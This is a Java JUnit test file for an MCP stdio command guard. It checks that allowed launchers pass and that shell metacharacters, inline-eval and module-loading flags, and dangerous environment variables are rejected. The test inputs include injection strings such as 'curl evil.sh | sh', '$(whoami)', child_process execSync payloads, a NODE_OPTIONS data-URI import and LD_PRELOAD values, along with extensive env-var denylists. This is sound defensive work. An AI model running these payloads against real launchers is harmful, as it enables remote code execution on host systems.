package com.agenticai.core.mcp;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.HashMap;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;
import org.junit.jupiter.params.provider.ValueSource;

/**
 * Launcher-allowlist accept/reject table (MCP-DOCTOR hardening). The accept
 * rows mirror what the curated catalog and the official-registry mapper
 * actually emit (npx/uvx/python3 + package args), so the guard can never
 * regress the existing "Add from catalog" flow.
 */
class McpStdioCommandGuardTest {

    private final McpStdioCommandGuard guard = new McpStdioCommandGuard("");

    // --- accepted launchers ------------------------------------------------------

    @ParameterizedTest
    @ValueSource(strings = {"npx", "node", "uvx", "uv", "python", "python3"})
    void acceptsEveryDefaultLauncher(String command) {
        assertTrue(guard.check(command, List.of("-y", "@modelcontextprotocol/server-brave-search")).isEmpty());
    }

    @Test
    void acceptsWindowsCmdAndExeVariantsOfAllowedLaunchers() {
        // normalizeCommandForWindows rewrites npx -> npx.cmd at spawn time -
        // the guard must accept both spellings or the connect-time re-check
        // would reject what the save-time check allowed.
        assertTrue(guard.check("npx.cmd", List.of("-y", "pkg")).isEmpty());
        assertTrue(guard.check("NPX.CMD", List.of()).isEmpty());
        assertTrue(guard.check("python.exe", List.of("-m", "mcp_server")).isEmpty());
    }

    @Test
    void acceptsTypicalRegistryStyleArgs() {
        assertTrue(guard.check("uvx", List.of("--from", "dee-mcp", "dee-mcp-server")).isEmpty());
        assertTrue(guard.check("python3", List.of("-m", "some_mcp_server", "--port=stdio")).isEmpty());
    }

    // --- rejected commands ---------------------------------------------------------

    @ParameterizedTest
    @ValueSource(strings = {"bash", "sh", "cmd", "powershell", "curl", "wget", "docker", "java", "perl", "ruby"})
    void rejectsEveryNonAllowlistedLauncher(String command) {
        assertTrue(guard.check(command, List.of()).isPresent(), command + " should be rejected");
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "/bin/bash",
        "/usr/bin/env",
        "C:\\Windows\\System32\\cmd.exe",
        "./node",
        "..\\npx.cmd"
    })
    void rejectsAbsoluteAndRelativePaths(String command) {
        assertTrue(guard.check(command, List.of()).isPresent(), command + " should be rejected");
    }

    @Test
    void rejectsBlankCommandAndEmbeddedWhitespace() {
        assertTrue(guard.check(null, List.of()).isPresent());
        assertTrue(guard.check("  ", List.of()).isPresent());
        assertTrue(guard.check("npx -y pkg", List.of()).isPresent());
    }

    @ParameterizedTest
    @ValueSource(strings = {"npx&&curl evil", "npx;id", "npx|nc", "npx`id`", "npx>out", "npx<in"})
    void rejectsShellMetacharactersInTheCommand(String command) {
        assertTrue(guard.check(command, List.of()).isPresent(), command + " should be rejected");
    }

    // --- rejected args -------------------------------------------------------------

    @Test
    void rejectsShellMetacharactersInArgs() {
        assertTrue(guard.check("npx", List.of("-y", "pkg && curl evil.sh | sh")).isPresent());
        assertTrue(guard.check("npx", List.of("`id`")).isPresent());
        assertTrue(guard.check("npx", List.of("a;b")).isPresent());
        assertTrue(guard.check("npx", List.of("$(whoami)")).isPresent());
        assertTrue(guard.check("npx", List.of("line1\nline2")).isPresent());
    }

    @Test
    void rejectsNullArgEntries() {
        java.util.ArrayList<String> args = new java.util.ArrayList<>();
        args.add(null);
        assertTrue(guard.check("npx", args).isPresent());
    }

    // --- config extension + throwing seam --------------------------------------------

    @Test
    void allowlistIsConfigExtendable() {
        McpStdioCommandGuard extended = new McpStdioCommandGuard("docker, deno");
        assertTrue(extended.check("docker", List.of("run", "-i", "some/mcp")).isEmpty());
        assertTrue(extended.check("deno", List.of()).isEmpty());
        // Extending never weakens the base rejections.
        assertTrue(extended.check("bash", List.of()).isPresent());
    }

    @Test
    void requireAllowedThrowsWithTheUserFacingReason() {
        IllegalArgumentException e = assertThrows(
            IllegalArgumentException.class, () -> guard.requireAllowed("bash", List.of("-c", "id")));
        assertTrue(e.getMessage().contains("not allowed"));
    }

    // --- Pentest C1: inline-eval flags on an ALLOWED launcher are RCE ----------------

    @Test
    void blocksNodeInlineEval() {
        assertTrue(guard.check("node", List.of("-e", "require('child_process').execSync('id')")).isPresent());
        assertTrue(guard.check("node", List.of("--eval", "process.exit(1)")).isPresent());
        assertTrue(guard.check("node", List.of("--print", "1+1")).isPresent());
    }

    @Test
    void blocksPythonInlineEval() {
        assertTrue(guard.check("python3", List.of("-c", "import os; os.system('id')")).isPresent());
        assertTrue(guard.check("python", List.of("--command", "print(1)")).isPresent());
    }

    @Test
    void blocksEvalFlagInEqualsForm() {
        // `--eval=<code>` — the token before '=' is the flag.
        assertTrue(guard.check("node", List.of("--eval=require('fs')")).isPresent());
    }

    @Test
    void allowsLegitimatePackageAndModuleEntrypoints() {
        // The real MCP-server invocation shapes must still pass.
        assertTrue(guard.check("npx", List.of("-y", "@some/mcp-server")).isEmpty());
        assertTrue(guard.check("uvx", List.of("--from", "some-mcp", "some-mcp-server")).isEmpty());
        assertTrue(guard.check("python", List.of("-m", "some_mcp_module")).isEmpty());
        assertTrue(guard.check("node", List.of("./server.js", "--port", "0")).isEmpty());
        // `-i`/bare `-` read from the platform-controlled stdin channel, not attacker args.
        McpStdioCommandGuard withDocker = new McpStdioCommandGuard("docker");
        assertTrue(withDocker.check("docker", List.of("run", "-i", "some/mcp")).isEmpty());
    }

    // =================================================================================
    // Security audit 2026-07-29 (§2 item 2): the eval-flag list missed every
    // MODULE-LOADING flag, and env was inspected by nothing at all.
    // =================================================================================

    // --- args: module-loading flags, both `--flag X` and `--flag=X` spellings ---------

    @ParameterizedTest
    @ValueSource(strings = {"--import", "--require", "--loader", "--experimental-loader", "--node-options"})
    void blocksModuleLoadingFlagsInSpaceForm(String flag) {
        assertThat(guard.check("node", List.of(flag, "data:text/javascript,import('child_process')")))
            .as("%s <payload> must be rejected", flag)
            .isPresent();
    }

    @ParameterizedTest
    @ValueSource(strings = {"--import", "--require", "--loader", "--experimental-loader", "--node-options"})
    void blocksModuleLoadingFlagsInEqualsForm(String flag) {
        assertThat(guard.check("node", List.of(flag + "=data:text/javascript,import('child_process')")))
            .as("%s=<payload> must be rejected", flag)
            .isPresent();
    }

    @Test
    void blocksTheDataUriImportThatNeedsNoWritableFile() {
        // The exact shape from the audit finding, as a plain arg.
        assertThat(guard.check("node",
            List.of("--import", "data:text/javascript,import('node:child_process').execSync('id')", "server.js")))
            .isPresent();
    }

    @Test
    void blocksTheWholeInspectFamilyBecauseTheDebuggerPortIsAnEvalEndpoint() {
        assertThat(guard.check("node", List.of("--inspect", "server.js"))).isPresent();
        assertThat(guard.check("node", List.of("--inspect-brk=0.0.0.0:9229", "server.js"))).isPresent();
        assertThat(guard.check("node", List.of("--inspect=0.0.0.0:9229"))).isPresent();
    }

    @Test
    void longFlagMatchingIsCaseInsensitiveBecauseNoLauncherAcceptsACaseVariantAnyway() {
        assertThat(guard.check("node", List.of("--IMPORT", "data:text/javascript,x"))).isPresent();
        assertThat(guard.check("node", List.of("--Eval=1+1"))).isPresent();
    }

    // --- args: node's short aliases, which are launcher-specific ----------------------

    @ParameterizedTest
    @ValueSource(strings = {"-p", "-r"})
    void blocksNodeShortAliasesForPrintAndRequire(String flag) {
        assertThat(guard.check("node", List.of(flag, "./evil.js")))
            .as("node %s is --print/--require", flag)
            .isPresent();
    }

    @Test
    void blocksNodeShortAliasesInTheirAttachedForm() {
        // `node -e"code"` / `node -r./evil.js` arrive as ONE argv token.
        assertThat(guard.check("node", List.of("-econsole.log(1)"))).isPresent();
        assertThat(guard.check("node", List.of("-r./evil.js"))).isPresent();
        assertThat(guard.check("node", List.of("-p1+1"))).isPresent();
    }

    @ParameterizedTest
    @CsvSource({
        // launcher, arg, second arg - every one of these `-p`/`-r` means
        // something legitimate and unrelated to node's --print/--require.
        "npx,-p,some-mcp-package",   // npx -p == --package
        "uv,-p,3.12",                // uv  -p == --python
        "uvx,-p,3.12",               // uvx -p == --python
        "npx,-r,us-east-1"           // consumed by the MCP server, not by node
    })
    void keepsShortAliasesUsableOnLaunchersWhereTheyMeanSomethingElse(String launcher, String flag, String value) {
        assertThat(guard.check(launcher, List.of(flag, value)))
            .as("%s %s %s is a legitimate invocation", launcher, flag, value)
            .isEmpty();
    }

    // --- args: single-dash clusters and attached values --------------------------------

    @Test
    void blocksShortOptionClustersThatSmuggleAnEvalFlag() {
        // `python -Bc '<code>'` and `npx -yc '<shell command>'` both walked
        // straight through the old whole-token comparison.
        assertThat(guard.check("python3", List.of("-Bc", "import os; os.system('id')"))).isPresent();
        assertThat(guard.check("python", List.of("-uc", "print(1)"))).isPresent();
        assertThat(guard.check("npx", List.of("-yc", "curl evil"))).isPresent();
    }

    @Test
    void blocksAttachedValueFormOfPythonInlineEval() {
        // python accepts `-c<code>` with no separator.
        assertThat(guard.check("python3", List.of("-cprint(1)"))).isPresent();
    }

    // --- args: regression - none of this may reject a real MCP invocation --------------

    @Test
    void doesNotSubstringMatchFlagsInsidePathsOrLongSingleDashOptions() {
        // A path that merely CONTAINS the text of a blocked flag is not a flag.
        assertThat(guard.check("node", List.of("./bin/server-r.js"))).isEmpty();
        assertThat(guard.check("npx", List.of("-y", "@scope/mcp-require-server"))).isEmpty();
        assertThat(guard.check("npx", List.of("-y", "some-mcp", "--data-dir=/opt/mcp/-import"))).isEmpty();
        // Go/Java-style single-dash long options belong to the MCP server and
        // are left alone as long as their FIRST letter isn't itself a blocked
        // short flag (see the known-over-block test below).
        assertThat(guard.check("npx", List.of("-y", "some-mcp", "-verbose"))).isEmpty();
        assertThat(guard.check("npx", List.of("-y", "some-mcp", "-port", "8080"))).isEmpty();
        assertThat(guard.check("npx", List.of("-y", "some-mcp", "-workspace", "/data"))).isEmpty();
    }

    @Test
    void knownAndAcceptedOverBlock_singleDashOptionsStartingWithABlockedLetter() {
        // Documented trade-off, not an oversight: `python -cprint(1)` and
        // `node -e"code"` arrive as ONE argv token with the payload attached,
        // and nothing distinguishes those from a server's own `-config`. The
        // eval form has to win. Workaround for a real server that needs it:
        // spell the option with two dashes (`--config`), which is unaffected.
        assertThat(guard.check("npx", List.of("-y", "some-mcp", "-config", "cfg.json"))).isPresent();
        assertThat(guard.check("npx", List.of("-y", "some-mcp", "--config", "cfg.json"))).isEmpty();
    }

    @Test
    void acceptsEveryStdioShapeTheCuratedCatalogActuallyEmits() {
        // Verbatim from McpCatalogService's CATALOG entries (command + args).
        assertThat(guard.check("npx", List.of("-y", "@modelcontextprotocol/server-github"))).isEmpty();
        assertThat(guard.check("npx", List.of("-y", "@modelcontextprotocol/server-brave-search"))).isEmpty();
        assertThat(guard.check("npx", List.of("-y", "@modelcontextprotocol/server-slack"))).isEmpty();
        assertThat(guard.check("npx",
            List.of("-y", "@modelcontextprotocol/server-postgres", "{{MCP_POSTGRES_CONNECTION_STRING}}"))).isEmpty();
    }

    // --- env: the hole the audit found -------------------------------------------------

    @Test
    void blocksTheNodeOptionsImportPayloadFromTheAuditFinding() {
        assertThat(guard.check("npx", List.of("-y", "@modelcontextprotocol/server-github"),
            Map.of("NODE_OPTIONS", "--import data:text/javascript,import('node:child_process').execSync('id')")))
            .as("NODE_OPTIONS reaches the child and executes - it must be rejected")
            .isPresent();
    }

    @ParameterizedTest
    @ValueSource(strings = {
        // Node / npm
        "NODE_OPTIONS", "NODE_PATH", "NODE_REPL_EXTERNAL_MODULE",
        "NPM_CONFIG_NODE_OPTIONS", "NPM_CONFIG_SCRIPT_SHELL",
        // CPython
        "PYTHONSTARTUP", "PYTHONPATH", "PYTHONHOME", "PYTHONUSERBASE",
        "PYTHONWARNINGS", "PYTHONINSPECT", "PYTHONEXECUTABLE",
        // shell gadgets (npm lifecycle scripts run through a shell)
        "BASH_ENV", "ENV", "SHELLOPTS",
        // other interpreters present in the image
        "PERL5OPT", "PERL5LIB", "RUBYOPT",
        // the image ships a JVM
        "JAVA_TOOL_OPTIONS", "_JAVA_OPTIONS", "JDK_JAVA_OPTIONS",
        // git runs during npm installs
        "GIT_SSH", "GIT_SSH_COMMAND", "GIT_EXTERNAL_DIFF",
        // PATH is what the launcher allowlist rests on
        "PATH"
    })
    void blocksEveryRuntimeControlEnvVar(String name) {
        assertThat(guard.check("npx", List.of("-y", "some-mcp"), Map.of(name, "anything")))
            .as("env %s must be rejected", name)
            .isPresent();
    }

    @ParameterizedTest
    @ValueSource(strings = {"LD_PRELOAD", "LD_LIBRARY_PATH", "LD_AUDIT", "DYLD_INSERT_LIBRARIES", "DYLD_LIBRARY_PATH"})
    void blocksTheWholeDynamicLinkerFamilyByPrefix(String name) {
        assertThat(guard.check("npx", List.of("-y", "some-mcp"), Map.of(name, "/tmp/evil.so")))
            .as("env %s must be rejected", name)
            .isPresent();
    }

    @Test
    void envDenylistMatchingIsCaseInsensitiveBecauseWindowsEnvLookupIs() {
        assertThat(guard.check("npx", List.of("-y", "some-mcp"), Map.of("node_options", "--require /tmp/x.js")))
            .isPresent();
        assertThat(guard.check("npx", List.of("-y", "some-mcp"), Map.of("Ld_Preload", "/tmp/evil.so")))
            .isPresent();
    }

    @Test
    void rejectsEnvNamesThatArentEnvNamesAtAll() {
        // Shellshock-style exported function, and other malformed names.
        assertThat(guard.checkEnv(Map.of("BASH_FUNC_x%%", "() { id; }"))).isPresent();
        assertThat(guard.checkEnv(Map.of("1STARTS_WITH_DIGIT", "v"))).isPresent();
        assertThat(guard.checkEnv(Map.of("HAS SPACE", "v"))).isPresent();
        assertThat(guard.checkEnv(Map.of("HAS=EQUALS", "v"))).isPresent();
        assertThat(guard.checkEnv(Map.of("", "v"))).isPresent();
    }

    @Test
    void rejectsNullEnvValuesAndNulBytes() {
        Map<String, String> nullValued = new HashMap<>();
        nullValued.put("SOME_TOKEN", null);
        assertThat(guard.checkEnv(nullValued)).isPresent();
        assertThat(guard.checkEnv(Map.of("SOME_TOKEN", "abc\0def"))).isPresent();
    }

    // --- env: regression - real MCP server credentials must still pass -----------------

    @Test
    void acceptsTheCredentialEnvVarsTheCuratedCatalogActuallyDeclares() {
        // McpCatalogService's requiredEnv lists, verbatim.
        assertThat(guard.check("npx", List.of("-y", "@modelcontextprotocol/server-github"),
            Map.of("GITHUB_PERSONAL_ACCESS_TOKEN", "ghp_xxx"))).isEmpty();
        assertThat(guard.check("npx", List.of("-y", "@modelcontextprotocol/server-brave-search"),
            Map.of("BRAVE_API_KEY", "brave-xxx"))).isEmpty();
        assertThat(guard.check("npx", List.of("-y", "@modelcontextprotocol/server-slack"),
            Map.of("SLACK_BOT_TOKEN", "xoxb-xxx", "SLACK_TEAM_ID", "T123"))).isEmpty();
        assertThat(guard.check("npx", List.of("-y", "@modelcontextprotocol/server-postgres"),
            Map.of("MCP_POSTGRES_CONNECTION_STRING", "postgresql://u:p@db:5432/x"))).isEmpty();
    }

    @Test
    void acceptsTheInertRuntimeVarsStdioServersRoutinelySet() {
        // Explicitly NOT denylisted - see BLOCKED_ENV_NAMES' javadoc. These are
        // why the PYTHON family is enumerated instead of prefix-matched.
        assertThat(guard.check("python3", List.of("-m", "some_mcp"),
            Map.of("PYTHONUNBUFFERED", "1", "PYTHONIOENCODING", "utf-8"))).isEmpty();
        assertThat(guard.check("npx", List.of("-y", "some-mcp"), Map.of("NODE_ENV", "production"))).isEmpty();
    }

    @Test
    void acceptsMultiLineSecretValuesLikeServiceAccountKeys() {
        // Newlines are legal in a VALUE (PEM keys, service-account JSON) - only
        // NUL is rejected. Rejecting newlines here would break real configs.
        assertThat(guard.check("uvx", List.of("some-mcp"),
            Map.of("GOOGLE_PRIVATE_KEY", "-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----\n")))
            .isEmpty();
    }

    @Test
    void nullAndEmptyEnvAreBothFine() {
        assertThat(guard.check("npx", List.of("-y", "some-mcp"), null)).isEmpty();
        assertThat(guard.check("npx", List.of("-y", "some-mcp"), Map.of())).isEmpty();
        assertThat(guard.checkEnv(null)).isEmpty();
    }

    // --- throwing seam for the env half -------------------------------------------------

    @Test
    void requireAllowedWithEnvThrowsTheUserFacingReason() {
        assertThatThrownBy(() -> guard.requireAllowed("npx", List.of("-y", "some-mcp"),
            Map.of("NODE_OPTIONS", "--import data:text/javascript,x")))
            .isInstanceOf(IllegalArgumentException.class)
            .hasMessageContaining("NODE_OPTIONS");
    }

    // --- SEC-030: widened env denylist ------------------------------------------

    @ParameterizedTest
    @ValueSource(strings = {
        // OpenSSL config / engine / provider loading
        "OPENSSL_CONF", "OPENSSL_ENGINES", "OPENSSL_MODULES",
        // the whole NODE_* family
        "NODE_OPTIONS", "NODE_EXTRA_CA_CERTS", "NODE_TLS_REJECT_UNAUTHORIZED", "NODE_REDIRECT_WARNINGS",
        "NODE_V8_COVERAGE", "NODE_COMPILE_CACHE", "NODE_PATH", "NODE_REPL_EXTERNAL_MODULE", "NODE_DEBUG_NATIVE",
        // TLS trust stores
        "SSL_CERT_FILE", "SSL_CERT_DIR", "REQUESTS_CA_BUNDLE", "CURL_CA_BUNDLE", "SSLKEYLOGFILE",
        // the whole PYTHON* family
        "PYTHONPATH", "PYTHONSTARTUP", "PYTHONBREAKPOINT", "PYTHONHOME", "PYTHONINSPECT", "PYTHONWARNINGS",
        "PYTHONUSERBASE", "PYTHONEXECUTABLE", "PYTHONSAFEPATH", "PYTHON_BASIC_REPL",
        // every npm config var
        "npm_config_userconfig", "npm_config_globalconfig", "npm_config_registry", "npm_config_prefix",
        "npm_config_cache", "npm_config_node_options", "npm_config_script_shell", "NPM_CONFIG_PROXY",
        // uv / pip index + config
        "UV_INDEX_URL", "UV_EXTRA_INDEX_URL", "UV_DEFAULT_INDEX", "UV_CONFIG_FILE", "UV_CACHE_DIR",
        "PIP_INDEX_URL", "PIP_EXTRA_INDEX_URL", "PIP_CONFIG_FILE", "PIP_TRUSTED_HOST",
        "COREPACK_NPM_REGISTRY",
        // loaders / shells / JVM
        "LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES", "BASH_ENV", "ENV",
        "JAVA_TOOL_OPTIONS", "_JAVA_OPTIONS", "JDK_JAVA_OPTIONS", "GCONV_PATH", "GLIBC_TUNABLES",
        // context
        "PATH", "HOME", "XDG_CONFIG_HOME",
        // proxy redirection bypasses egress controls
        "HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "NO_PROXY",
        // git exec-by-env / config injection
        "GIT_ASKPASS", "GIT_CONFIG_GLOBAL", "GIT_CONFIG_COUNT", "GIT_SSL_NO_VERIFY"
    })
    void sec030_blocksEachRuntimeControlVarInEveryCase(String name) {
        for (String variant : List.of(name, name.toLowerCase(java.util.Locale.ROOT), name.toUpperCase(java.util.Locale.ROOT),
            mixedCase(name))) {
            assertThat(guard.check("npx", List.of("-y", "some-mcp"), Map.of(variant, "x")))
                .as("env %s must be rejected", variant)
                .isPresent();
            assertThat(McpStdioCommandGuard.isBlockedEnvName(variant)).as(variant).isTrue();
        }
    }

    private static String mixedCase(String name) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < name.length(); i++) {
            char c = name.charAt(i);
            sb.append(i % 2 == 0 ? Character.toLowerCase(c) : Character.toUpperCase(c));
        }
        return sb.toString();
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "GITHUB_TOKEN", "API_KEY", "GITHUB_PERSONAL_ACCESS_TOKEN", "BRAVE_API_KEY", "SLACK_BOT_TOKEN",
        "MCP_POSTGRES_CONNECTION_STRING", "OPENAI_API_KEY", "HASS_URL", "NODE_ENV", "node_env", "NODE_NO_WARNINGS",
        "PYTHONUNBUFFERED", "PYTHONIOENCODING", "PYTHONDONTWRITEBYTECODE", "PYTHONUTF8", "LOG_LEVEL", "GIT_AUTHOR_NAME"
    })
    void sec030_benignVarsStillPass(String name) {
        assertThat(guard.check("npx", List.of("-y", "some-mcp"), Map.of(name, "value"))).as(name).isEmpty();
    }
}
